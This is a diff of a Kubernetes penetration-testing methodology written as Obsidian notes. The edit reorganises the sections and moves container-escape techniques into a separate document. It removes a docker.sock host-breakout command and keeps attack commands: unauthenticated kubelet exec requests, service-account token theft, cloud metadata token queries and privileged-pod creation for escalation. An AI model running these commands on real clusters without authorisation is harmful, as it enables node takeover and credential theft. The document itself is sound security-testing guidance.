@@ -7,14 +7,14 @@ includeLinks: true # Make headings clickable
 debugInConsole: false # Print debug info in Obsidian console
 ```
 
-> This methodology targets **Kubernetes clusters and the containers running on them**, independent of underlying infrastructure (self-managed, EKS, AKS, GKE, OpenShift, etc.). Cloud-provider-specific control plane concerns (eg. EKS endpoint access, IRSA, Azure AD Pod Identity) are only lightly touched here - cross-reference the relevant cloud methodology ([[AWS Testing#4.4 - EKS|AWS Testing §4.4/§8]]) for those. The focus here is anything that's true of Kubernetes/containers regardless of who hosts the control plane.
+> This methodology targets **Kubernetes clusters and their orchestration-level configuration** (RBAC, admission control, NetworkPolicy, secrets, exposure), independent of underlying infrastructure (self-managed, EKS, AKS, GKE, OpenShift, etc.). Cloud-provider-specific control plane concerns (eg. EKS endpoint access, IRSA, Azure AD Pod Identity) are only lightly touched here - cross-reference the relevant cloud methodology ([[AWS Testing#4.4 - EKS|AWS Testing §4.4/§8]]) for those. Hands-on testing of a specific container's runtime/escape surface - once a workload has been identified as worth that depth of testing - is its own dedicated methodology: **[[Container Testing]]**. The focus here is the cluster layer; that doc is the container layer.
 >
 > Each section includes: **purpose/context**, **possible vulnerabilities**, **commands to run**, and **what a positive finding looks like**. Sections are ordered roughly by attacker kill-chain stage (external recon → initial access → in-cluster enumeration → privilege escalation → lateral movement/escape → persistence), so a black-box engagement can largely work top-to-bottom, while a white-box config review can jump straight to the section matching whatever access was granted.
 
 ---
 
 ## 0 - Scoping & Access Prep
-### 0.1 - Scoping Questions
+### Scoping Questions
 - Is this a black-box engagement (no cluster access, attacking from outside/via a workload) or a white-box config review (`kubeconfig` provided)?
 - What's the trust level of the credentials/access provided? (unauthenticated, a specific namespace's service account, a read-only cluster role, cluster-admin)
 - Is active exploitation in scope (container breakout attempts, actually escalating privilege, pivoting to the underlying cloud account) or is this a configuration review only?
@@ -24,13 +24,13 @@ debugInConsole: false # Print debug info in Obsidian console
 - Are there production workloads where a crash/restart would cause real impact? (affects whether DoS-adjacent tests like resource exhaustion are permitted)
 - Who is the technical point of contact if a test causes a pod eviction, node drain, or unexpected restart?
 
-### 0.2 - Access Model
+### Access Model
 - Preferred: a **read-only, namespace-scoped** `kubeconfig` as a starting point, escalating manually as findings justify broader access, rather than starting with cluster-admin
 - If testing is meant to simulate "attacker who popped a specific workload", request only that workload's mounted service account token rather than a separate kubeconfig
 - Confirm whether the kubeconfig uses client certs, a bearer token, an OIDC/exec plugin (common for managed clusters - `aws eks get-token`, `az aks get-credentials`, `gcloud container clusters get-credentials`), or static tokens
 - Get the API server endpoint and confirm reachability before assuming VPN/network access issues are a cluster misconfiguration
 
-### 0.3 - Tooling Setup
+### Tooling Setup
 ```bash
 kubectl version --client
 kubectl config get-contexts
@@ -46,17 +46,17 @@ kubectl get ns
 ---
 
 ## 1 - External Recon & Attack Surface (Black-Box)
-### 1.1 - Purpose
+### Purpose
 Identify what's exposed to the internet before any cluster access is assumed - the API server itself, exposed dashboards, and application-layer services fronted by the cluster (Ingress/LoadBalancer).
 
-### 1.2 - Possible Vulnerabilities
+### Possible Vulnerabilities
 - Kubernetes API server exposed to the internet with weak/no authentication
 - Anonymous access enabled on the API server (`system:anonymous` mapped to a usable role)
 - Exposed dashboards (Kubernetes Dashboard, Kubecost, Weave Scope, kube-ops-view) with no auth in front of them
 - Kubelet API (port `10250`) or read-only kubelet port (`10255`, deprecated but still seen) reachable directly
 - etcd exposed and unauthenticated (port `2379`)
 
-### 1.3 - Commands
+### Commands
 ```bash
 # API server discovery / version leak (often exposed even when auth is enforced)
 curl -sk https://<target>:6443/version
@@ -74,7 +74,7 @@ nmap -p 6443,8443,10250,10255,2379,2380,30000-32767 <target>
 ```
 - `30000-32767` is the default NodePort range - sweep it for inadvertently exposed Services
 
-### 1.4 - What to Look For
+### What to Look For
 - `/version` or `/healthz` responding without authentication confirms the API server is reachable - note the version for known-CVE triage (see [[#9 - Known CVE Checklist]])
 - `/api/v1/namespaces` returning actual namespace data with no credentials = anonymous access is misconfigured (should 403/401)
 - A dashboard login page with default creds, or no login page at all serving live cluster data
@@ -83,17 +83,17 @@ nmap -p 6443,8443,10250,10255,2379,2380,30000-32767 <target>
 ---
 
 ## 2 - Authentication & RBAC Enumeration
-### 2.1 - Purpose
+### Purpose
 Once any credential is obtained (service account token, kubeconfig, OIDC identity), establish exactly what it can do. RBAC misconfiguration is the Kubernetes equivalent of IAM misconfiguration in a cloud review - this is usually where the real findings are.
 
-### 2.2 - Possible Vulnerabilities
+### Possible Vulnerabilities
 - Over-permissive `ClusterRoleBindings`/`RoleBindings` (eg. a CI service account bound to `cluster-admin`)
 - Wildcard verbs/resources in `Role`/`ClusterRole` rules (`"*"` on `resources` or `verbs`)
 - Default service account (in any namespace) granted meaningful permissions instead of the intended least-privilege one
 - `system:authenticated` or `system:unauthenticated` groups bound to anything beyond the absolute minimum
 - Ability to `impersonate` other users/groups/service accounts
 
-### 2.3 - Commands
+### Commands
 ```bash
 # What can I do? (single most useful command in this whole methodology)
 kubectl auth can-i --list
@@ -118,7 +118,7 @@ rbac-tool viz --kubeconfig ~/.kube/config -o rbac-graph.png
 rbac-police audit                            # risky-permission detection (wildcards, escalate verbs, etc.)
 ```
 
-### 2.4 - RBAC Privilege Escalation Patterns
+### RBAC Privilege Escalation Patterns
 > Mirrors the IAM privesc graphing done in [[AWS Testing#2.4 - Privilege Escalation Paths]] - same idea, different permission model.
 
 Check whether the current principal (or anything it can modify) holds any of:
@@ -131,7 +131,7 @@ Check whether the current principal (or anything it can modify) holds any of:
 - `get`/`list` on `secrets` cluster-wide - harvest other service accounts' tokens directly
 - `exec`/`attach` subresource on `pods` in a namespace with more privileged workloads
 
-### 2.5 - What to Look For
+### What to Look For
 - `kubectl auth can-i --list` returning `*` for resources or verbs
 - Any non-system `ClusterRoleBinding` targeting `cluster-admin`
 - A namespace's `default` service account with a non-empty `RoleBinding` (it should almost always have none)
@@ -140,10 +140,10 @@ Check whether the current principal (or anything it can modify) holds any of:
 ---
 
 ## 3 - Workload & Pod Security Configuration
-### 3.1 - Purpose
+### Purpose
 Assess whether running workloads are configured to minimise blast radius if compromised - this determines how bad a container compromise actually is, independent of the application vulnerability that got you there.
 
-### 3.2 - Possible Vulnerabilities
+### Possible Vulnerabilities
 - `privileged: true` containers (full host device/capability access)
 - `hostPID` / `hostIPC` / `hostNetwork` enabled unnecessarily
 - Containers running as root (`runAsUser: 0` or unset, no `runAsNonRoot`)
@@ -154,7 +154,7 @@ Assess whether running workloads are configured to minimise blast radius if comp
 - No resource `limits` set (noisy-neighbour/DoS risk on shared nodes)
 - Service account tokens auto-mounted into pods that never call the API (`automountServiceAccountToken` left at default `true`)
 
-### 3.3 - Commands
+### Commands
 ```bash
 # Pull full pod specs for manual/scripted review
 kubectl get pods --all-namespaces -o json > all-pods.json
@@ -171,7 +171,7 @@ trivy k8s cluster --compliance=k8s-nsa      # or k8s-cis
 popeye --kubeconfig ~/.kube/config          # cluster-wide "linting" for risk, resource, and RBAC issues
 ```
 
-### 3.4 - What to Look For
+### What to Look For
 - Any `privileged: true` container that isn't an explicitly-justified system/CNI/CSI component (those legitimately need it - flag unexpected ones only)
 - `hostPath` mounts pointing at sensitive host paths with `readOnly: false`
 - Applications (not infra DaemonSets) running with `hostNetwork`/`hostPID`/`hostIPC`
@@ -180,17 +180,17 @@ popeye --kubeconfig ~/.kube/config          # cluster-wide "linting" for risk, r
 ---
 
 ## 4 - Pod Security Admission & Policy Enforcement
-### 4.1 - Purpose
+### Purpose
 Determine whether the hardening expected in §3 is actually *enforced* at admission time, or just a convention that's been drifted away from. A cluster with great-looking existing pods but no enforcement is one bad deployment away from a bad pod.
 
-### 4.2 - Possible Vulnerabilities
+### Possible Vulnerabilities
 - No admission controller enforcing Pod Security Standards at all (anything goes on `kubectl apply`)
 - Pod Security Admission (PSA) labels set to `privileged` or missing entirely on sensitive namespaces
 - Legacy PodSecurityPolicy (PSP) still referenced in docs/configs, but PSPs were removed in K8s 1.25+ - confirm the cluster actually migrated to PSA/OPA/Kyverno rather than silently losing enforcement
 - OPA Gatekeeper / Kyverno installed but policies only in `audit`/`dryrun` mode, not `enforce`/`deny`
 - Admission webhook `failurePolicy: Ignore` - if the webhook is down, enforcement silently disappears
 
-### 4.3 - Commands
+### Commands
 ```bash
 # Pod Security Admission labels per namespace
 kubectl get ns -o custom-columns='NAME:.metadata.name,ENFORCE:.metadata.labels."pod-security.kubernetes.io/enforce"'
@@ -207,7 +207,7 @@ kubectl get clusterpolicies -o custom-columns='NAME:.metadata.name,ACTION:.spec.
 kubectl get validatingwebhookconfigurations -o json | jq '.items[].webhooks[] | {name: .name, failurePolicy: .failurePolicy}'
 ```
 
-### 4.4 - What to Look For
+### What to Look For
 - Namespaces with no `pod-security.kubernetes.io/enforce` label (defaults to `privileged` cluster-wide unless an admission controller fills the gap)
 - Gatekeeper constraints with `enforcementAction: dryrun` on anything security-critical
 - Kyverno policies with `validationFailureAction: audit` left in that state long-term (fine temporarily during rollout, a finding if permanent)
@@ -216,17 +216,17 @@ kubectl get validatingwebhookconfigurations -o json | jq '.items[].webhooks[] | 
 ---
 
 ## 5 - Secrets Management
-### 5.1 - Purpose
+### Purpose
 Kubernetes `Secret` objects are base64-encoded, not encrypted, by default. Assess how secrets actually reach workloads and whether that chain has any weak link.
 
-### 5.2 - Possible Vulnerabilities
+### Possible Vulnerabilities
 - Secrets stored as plain `Secret` objects with no envelope encryption at the etcd layer (encryption-at-rest for Secrets not configured)
 - Hardcoded credentials in `ConfigMaps` or plain environment variables instead of `Secret`/external secret managers
 - Secrets mounted as environment variables (visible via `kubectl describe pod`, process environ, crash logs) rather than files
-- Any principal with `get`/`list` on `secrets` cluster-wide (ties back to [[#2.4 - RBAC Privilege Escalation Patterns]])
+- Any principal with `get`/`list` on `secrets` cluster-wide (ties back to [[#RBAC Privilege Escalation Patterns]])
 - External secret operators (External Secrets Operator, Vault Agent) misconfigured so the backing secret store's credentials are themselves over-exposed in-cluster
 
-### 5.3 - Commands
+### Commands
 ```bash
 # Can the current principal read secrets broadly?
 kubectl auth can-i list secrets --all-namespaces
@@ -244,7 +244,7 @@ kubectl get configmaps --all-namespaces -o json | jq -r '.items[] | select(.data
 cat /etc/kubernetes/manifests/kube-apiserver.yaml | grep encryption-provider-config
 ```
 
-### 5.4 - What to Look For
+### What to Look For
 - Secrets decodable to real credentials (DB passwords, API keys, cloud provider keys) rather than placeholders
 - `ConfigMaps` containing obvious secret material - a very common finding, teams often "know" Secrets exist but still put something sensitive in a ConfigMap
 - No `EncryptionConfiguration` applied to the API server (secrets stored as base64 only, in plaintext in etcd)
@@ -253,17 +253,17 @@ cat /etc/kubernetes/manifests/kube-apiserver.yaml | grep encryption-provider-con
 ---
 
 ## 6 - Network Policy & Segmentation
-### 6.1 - Purpose
+### Purpose
 By default, Kubernetes allows all pod-to-pod traffic within a cluster regardless of namespace. Assess whether intended tenant/environment isolation is actually enforced at the network layer or just assumed via namespacing.
 
-### 6.2 - Possible Vulnerabilities
+### Possible Vulnerabilities
 - No `NetworkPolicy` resources at all (fully flat network - any pod can reach any pod/service)
 - `NetworkPolicies` defined but the CNI plugin doesn't enforce them (eg. basic kubenet, or AWS VPC CNI without the network policy add-on) - gives a false sense of security
 - Default-allow instead of default-deny - policies defined per-app without a namespace-wide default-deny baseline, so anything *not* explicitly covered is still fully open
 - Egress unrestricted, allowing data exfiltration or C2 callback from a compromised pod
 - Multi-tenant clusters relying on namespace boundaries alone with no corresponding NetworkPolicy
 
-### 6.3 - Commands
+### Commands
 ```bash
 kubectl get networkpolicies --all-namespaces
 
@@ -276,7 +276,7 @@ wget -qO- --timeout=2 http://<other-ns-service>.<other-ns>.svc.cluster.local
 kubectl get pods -n kube-system -o wide | grep -iE 'calico|cilium|weave|flannel|aws-node|azure-cni'
 ```
 
-### 6.4 - What to Look For
+### What to Look For
 - Zero `NetworkPolicy` objects in a namespace that's supposed to be isolated from others
 - A cross-namespace connection succeeding from the test pod when the intended design says it shouldn't
 - CNI identified as one with limited/no NetworkPolicy enforcement (eg. plain `kubenet`, Flannel without a policy add-on) despite policies being defined - the policies are decorative
@@ -285,17 +285,17 @@ kubectl get pods -n kube-system -o wide | grep -iE 'calico|cilium|weave|flannel|
 ---
 
 ## 7 - Ingress, Services & Exposure
-### 7.1 - Purpose
+### Purpose
 Identify unintended exposure paths - Services and Ingress resources that expose more than intended, and misconfigurations in the ingress controller itself.
 
-### 7.2 - Possible Vulnerabilities
+### Possible Vulnerabilities
 - `Service` of type `LoadBalancer`/`NodePort` exposing something meant to be internal-only
 - Ingress resources with no TLS, or TLS termination misconfigured
 - Ingress controller admin/metrics endpoints exposed alongside application traffic
 - Overly permissive Ingress annotations (eg. `nginx.ingress.kubernetes.io/whitelist-source-range` misconfigured or missing where expected)
 - Wildcard/default backend misconfiguration leaking information about other hosted services on a shared ingress controller
 
-### 7.3 - Commands
+### Commands
 ```bash
 kubectl get svc --all-namespaces -o wide | grep -E 'LoadBalancer|NodePort'
 kubectl get ingress --all-namespaces -o wide
@@ -306,7 +306,7 @@ curl -sk https://<ingress-host>/nginx_status
 curl -sk https://<ingress-host>:10254/metrics   # nginx-ingress-controller default metrics port
 ```
 
-### 7.4 - What to Look For
+### What to Look For
 - A `Service` type that doesn't match the workload's intended exposure (eg. an internal admin panel on `LoadBalancer`)
 - Ingress with no `tls:` block serving sensitive data over plain HTTP
 - Metrics/status endpoints reachable without auth, leaking internal hostnames, upstream IPs, or request data
@@ -314,10 +314,10 @@ curl -sk https://<ingress-host>:10254/metrics   # nginx-ingress-controller defau
 ---
 
 ## 8 - Container & Supply Chain
-### 8.1 - Purpose
+### Purpose
 Shift from cluster configuration to what's actually running inside the containers - image provenance, known vulnerabilities, and registry security.
 
-### 8.2 - Possible Vulnerabilities
+### Possible Vulnerabilities
 - Container images with known-vulnerable OS packages or application dependencies
 - Images pulled from `:latest` or other mutable tags (no guarantee of what's actually running, breaks reproducibility of findings)
 - Hardcoded secrets baked into image layers (even if removed in a later layer, still present in history)
@@ -325,7 +325,7 @@ Shift from cluster configuration to what's actually running inside the container
 - Base images from unverified/untrusted sources
 - No image signing/verification (Cosign/Notary) enforced at admission
 
-### 8.3 - Commands
+### Commands
 ```bash
 # Image vulnerability + misconfig + secret scanning - the standard tool for this
 trivy image <registry>/<image>:<tag>
@@ -345,7 +345,7 @@ grype <image>
 dockle <image>
 ```
 
-### 8.4 - What to Look For
+### What to Look For
 - `CRITICAL`/`HIGH` CVEs in packages that are actually reachable/exploitable given the workload's exposure (don't just report raw CVE counts - correlate with network exposure from §7 for severity)
 - Secrets flagged by Trivy's secret scanner inside image layers
 - A significant fraction of running images on `:latest` across the cluster - a process finding worth calling out even without a specific CVE attached
@@ -354,10 +354,12 @@ dockle <image>
 ---
 
 ## 9 - Container Escape & Node Compromise (Active Exploitation)
-### 9.1 - Purpose
+### Purpose
 > Requires explicit authorisation beyond passive config review. This confirms the *theoretical* blast radius identified in §3 is actually achievable, framed as: *"if an attacker got RCE in this specific container, what's the real impact?"*
+>
+> The full hands-on methodology for this - container fingerprinting, capability/namespace/mount enumeration, the low-footprint testing workflow (no package installs, no binaries left on disk), named escape techniques with PoCs, and how to approach testing many containers at scale - now lives in its own dedicated doc: **[[Container Testing]]**. This section stays scoped to the Kubernetes-specific entry points into that methodology.
 
-### 9.2 - Possible Vulnerabilities / Escape Vectors
+### Possible Vulnerabilities / Escape Vectors
 - Privileged container → full host access
 - Mounted Docker/containerd socket → trivial container creation on the host
 - Writable sensitive `hostPath` mount (eg. `/var/lib/kubelet`, cron directories, systemd unit paths)
@@ -365,51 +367,36 @@ dockle <image>
 - Kernel vulnerabilities exploitable from within a container's namespace (shared kernel with host)
 - Kubelet API (`10250`) reachable without client cert auth, allowing arbitrary `exec` into any pod on that node
 
-### 9.3 - Commands
+> For all of the above except the kubelet-specific one, go to [[Container Testing#5 - Low-Footprint Testing Workflow|Container Testing §5]] for the tiered no-install testing approach and [[Container Testing#6 - Known Escape Techniques|§6]] for the technique-by-technique PoCs.
+
+### Commands
 ```bash
-# Get a shell in the target container
+# Getting into a specific pod to hand off to the Container Testing methodology
 kubectl exec -it <pod> -n <ns> -- sh
 
-# Fast in-container enumeration of escape-relevant config - do this before manual checks
-deepce                      # Docker/container enumeration script, works well inside k8s pods too
-amicontained                 # quick capability/namespace/seccomp summary
-
-# Manual checks if the above aren't available
-cat /proc/1/status | grep CapEff     # effective capabilities
-capsh --print                         # requires capsh installed in the container
-mount | grep docker.sock
-ls -la /var/run/docker.sock /run/containerd/containerd.sock 2>/dev/null
-cat /proc/self/cgroup                 # confirm actually in a container, check cgroup driver
-
-# If docker.sock is mounted - trivial host breakout
-curl --unix-socket /var/run/docker.sock http://localhost/containers/json
-docker -H unix:///var/run/docker.sock run -v /:/host -it --rm alpine chroot /host sh
-
-# Kubelet API unauthenticated check (from a node or pod with hostNetwork, or externally if exposed)
+# Kubernetes-specific: kubelet API unauthenticated check (from a node-level debug pod per Container Testing §5 Tier 3, or externally if exposed per §1)
 curl -sk https://<node-ip>:10250/pods
 curl -sk https://<node-ip>:10250/exec/<ns>/<pod>/<container>?command=id&input=1&output=1&tty=1 -X POST
 ```
 
-### 9.4 - What to Look For
-- Successful `chroot`/host filesystem access via the Docker socket
-- `deepce`/`amicontained` flagging `CAP_SYS_ADMIN` or privileged mode with a working PoC escape
-- Kubelet `/pods` or `/exec` endpoints responding without a valid client certificate - this is a critical finding (unauthenticated RCE on the node)
-- Successful read/write to host paths outside the container's intended filesystem
+### What to Look For
+- Kubelet `/pods` or `/exec` endpoints responding without a valid client certificate - this is a critical finding (unauthenticated RCE on the node, no container escape technique even required)
+- Everything else - successful privilege/capability/mount-based escape, confirmed via [[Container Testing]] - rolls back up into this section's findings when reporting on this cluster
 
 ---
 
 ## 10 - Lateral Movement, Pivoting & Persistence
-### 10.1 - Purpose
+### Purpose
 From an initial foothold (stolen SA token, compromised container, or node access), determine how far an attacker can actually move - across pods, namespaces, and out to the underlying cloud account.
 
-### 10.2 - Possible Vulnerabilities
+### Possible Vulnerabilities
 - A stolen service account token with broad API permissions (ties directly back to [[#2 - Authentication & RBAC Enumeration]])
 - Cloud credentials reachable from inside a pod (IRSA/Workload Identity tokens, or IMDS reachable with the node's own role if not properly isolated - see [[AWS Testing#8.3 - IMDS Exposure]] for the AWS-specific angle)
 - Ability to create new pods/deployments with a more privileged service account or `hostPath` mounts, enabling a slower but reliable persistence/escalation path
 - Weakly-protected CI/CD service accounts with cluster-wide `deploy`/`create` rights, giving a path from "compromised pipeline" to "cluster-admin"
 - Backdoor-able admission webhooks or controllers running with excessive privilege
 
-### 10.3 - Commands
+### Commands
 ```bash
 # Confirm what the stolen/current token can actually do cluster-wide
 TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
@@ -429,7 +416,7 @@ curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/tok
 kubectl run privesc --image=alpine --overrides='{"spec":{"hostPID":true,"containers":[{"name":"privesc","image":"alpine","securityContext":{"privileged":true},"command":["sleep","3600"]}]}}' -n <ns>
 ```
 
-### 10.4 - What to Look For
+### What to Look For
 - A low-trust starting token (eg. a public-facing app's SA) that can reach Secrets or create pods outside its own namespace
 - Workload identity federation (IRSA, Azure Workload Identity, GKE Workload Identity) tokens that map to a cloud role/identity broader than the specific workload needs
 - Successful creation of a privileged pod from an identity that shouldn't be able to - confirms the RBAC gap from §2 is exploitable, not just theoretical
@@ -464,12 +451,13 @@ kubectl run privesc --image=alpine --overrides='{"spec":{"hostPID":true,"contain
 | [rbac-tool](https://github.com/alcideio/rbac-tool) | RBAC analysis, lookup, and visualisation for Kubernetes | Graphing who-can-do-what and privilege escalation paths at scale (§2, §11) | [Install guide](https://github.com/alcideio/rbac-tool#install) |
 | [kubescape](https://github.com/kubescape/kubescape) | Kubernetes security posture scanner (NSA/CISA, MITRE ATT&CK, CIS frameworks) | Framework-aligned full-cluster scanning, alternative/complement to kube-bench+Trivy | [Install guide](https://kubescape.io/docs/getting-started/installation-cli/) |
 | [Peirates](https://github.com/inguardians/peirates) | Kubernetes penetration testing tool for privilege escalation and lateral movement from a stolen service account token | Automating SA-token-to-cluster-privesc chains (§10) | [Install guide](https://github.com/inguardians/peirates#installation) |
-| [deepce](https://github.com/stealthcopter/deepce) | Docker/container enumeration script | Fast in-container enumeration of escape vectors (§9) | `curl` the single script - see [repo](https://github.com/stealthcopter/deepce) |
-| [amicontained](https://github.com/genuinetools/amicontained) | Container introspection tool (capabilities, namespaces, seccomp, AppArmor) | Quick summary of what an escape attempt has to work with (§9) | [Install guide](https://github.com/genuinetools/amicontained#installation) |
+| [netshoot](https://github.com/nicolaka/netshoot) | Network/container troubleshooting image bundling common CLI tools (curl, nmap, tcpdump, etc.) | Default image for `kubectl debug` ephemeral/node debug containers - gets tooling onto a pod/node without altering the target (§9) | `docker pull nicolaka/netshoot` (pulled automatically by `kubectl debug --image=nicolaka/netshoot`) |
 | [Gatekeeper](https://github.com/open-policy-agent/gatekeeper) | OPA-based policy admission controller | Reviewing/assessing policy-as-code enforcement (§4) | [Install guide](https://open-policy-agent.github.io/gatekeeper/website/docs/install/) |
 | [Kyverno](https://github.com/kyverno/kyverno) | Kubernetes-native policy engine | Reviewing/assessing policy-as-code enforcement (§4) | [Install guide](https://kyverno.io/docs/installation/) |
 | [kubeaudit](https://github.com/Shopify/kubeaudit) | Audits clusters against common security hardening checks | Alternative/complement to Popeye for workload hardening checks (§3) | [Install guide](https://github.com/Shopify/kubeaudit#installation) |
 | [checkov](https://github.com/bridgecrewio/checkov) / [tfsec](https://github.com/aquasecurity/tfsec) | Static analysis for IaC (Terraform/Helm/Kustomize) | IaC review if cluster manifests/Helm charts are provided as source (cross-ref [[AWS Testing#10.4 - IaC Review (if source available)]]) | [checkov install](https://www.checkov.io/2.Basics/Installing%20Checkov.html) / [tfsec install](https://aquasecurity.github.io/tfsec/latest/getting-started/installation/) |
+
+> Container-escape-specific tools (deepce, amicontained, CDK, BOtB) and the full low-footprint escape testing workflow now live in [[Container Testing#10 - Tooling|Container Testing §10]] - not duplicated here.
 
 ---
 
@@ -514,3 +502,4 @@ kubectl run privesc --image=alpine --overrides='{"spec":{"hostPID":true,"contain
 - [Kubernetes Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/) - the baseline/restricted/privileged tiers referenced throughout §3/§4
 - [OWASP Kubernetes Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Kubernetes_Security_Cheat_Sheet.html)
 - Cross-reference cloud-specific control plane concerns: [[AWS Testing#4.4 - EKS|AWS Testing §4.4/§8]] for EKS-specific identity/IMDS/IRSA detail
+- Cross-reference container runtime/escape testing: [[Container Testing]] for the hands-on methodology once inside a specific workload
